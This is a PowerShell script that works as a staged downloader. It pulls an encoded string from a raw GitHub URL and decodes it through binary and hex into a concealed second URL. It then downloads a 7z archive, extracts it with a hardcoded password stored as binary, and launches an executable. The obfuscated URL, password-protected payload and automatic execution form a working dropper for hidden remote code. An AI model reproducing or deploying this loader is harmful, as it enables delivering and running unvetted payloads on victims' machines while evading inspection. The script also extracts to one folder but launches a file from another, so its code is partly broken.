Function Convert-EncodedStringToBinary {
    Param ([string]$encodedString)
    # Ensure that only intended characters are replaced and consider handling or escaping '/' if it's part of your encoding scheme.
    $binaryString = $encodedString -replace ',', '0' -replace '\.', '1' -replace '/', '1' # Assuming '/' should also be converted to '1', adjust this according to your encoding logic.
    Write-Host "Display encoded:"
    Write-Host $encodedString
    Write-Host "Display binary:"
    Write-Host $binaryString
    return $binaryString
}

Function Convert-BinaryToHex {
    Param ([string]$binaryString)
    # Pad binary string to make its length a multiple of 8
    $padLength = 8 - ($binaryString.Length % 8)
    if ($padLength -ne 8) {
        $binaryString = $binaryString + ('0' * $padLength)
    }
    $binaryGroups = $binaryString -split '(?<=\G.{8})'
    $hexString = $binaryGroups | ForEach-Object {
        # Ensure input for ToInt32 is a valid 8-bit binary string to avoid conversion errors.
        if ($_ -match '^[01]{8}$') {
            '{0:X2}' -f [Convert]::ToInt32($_, 2)
        } else {
            Write-Error "Invalid binary group: $_"
            return $null
        }
    }
    Write-Host "Display hex:"
    Write-Host ($hexString -join '')
    return ($hexString -join '')
}

Function Convert-HexToASCII {
    Param ([string]$hexString)
    $bytes = for ($i = 0; $i -lt $hexString.Length; $i += 2) {
        [Convert]::ToByte($hexString.Substring($i, 2), 16)
    }
    $asciiText = [System.Text.Encoding]::ASCII.GetString($bytes)
    Write-Host "Display ASCII (Hex to Text):"
    Write-Host $asciiText
    return $asciiText
}

Function Download-File {
    Param ([string]$url, [string]$path)
    Write-Host "Display URL:"
    Write-Host $url
    Invoke-WebRequest -Uri $url -OutFile $path
}

Function DownloadAndExtract7Zip {
    $sevenZipUrl = "https://www.7-zip.org/a/7za920.zip"
    $sevenZipDownloadPath = "S:\downloader\7za.zip"
    $sevenZipExtractPath = "S:\downloader\7zip"
    Invoke-WebRequest -Uri $sevenZipUrl -OutFile $sevenZipDownloadPath
    Expand-Archive -Path $sevenZipDownloadPath -DestinationPath $sevenZipExtractPath
}

Function Get-DecryptedPassword {
    $hardcodedBinary = "0011000100110010001100110011010000110101"
    $password = ($hardcodedBinary -split '(?<=\G.{8})' | ForEach-Object { [char][Convert]::ToInt32($_, 2) }) -join ''
    Write-Host "Display password:"
    Write-Host $password
    return $password
}

# Main script execution flow corrected
$url = "https://raw.githubusercontent.com/1/1/main/8.txt" # Use the actual GitHub URL where the encoded string is hosted
$rawText = Invoke-RestMethod -Uri $url
Write-Host "Display text (Encoded):"
Write-Host $rawText

$binaryString = Convert-EncodedStringToBinary -encodedString $rawText
$hexString = Convert-BinaryToHex -binaryString $binaryString
$asciiText = Convert-HexToASCII -hexString $hexString # Now correctly interpreted as the final URL

$downloadPath = "S:\downloader\DownloadedFile.7z"
Download-File -url $asciiText -path $downloadPath

DownloadAndExtract7Zip

$password = Get-DecryptedPassword
$sevenZipCmdPath = "S:\downloader\7zip\7za.exe"
& $sevenZipCmdPath x $downloadPath -o"S:\downloader\ExtractedFile" -p$password

$extractedFilePath = "S:\downloader\YourExecutable.exe"
if (Test-Path -Path $extractedFilePath) {
Invoke-Item $extractedFilePath
} else {
Write-Error "The extracted file does not exist."
}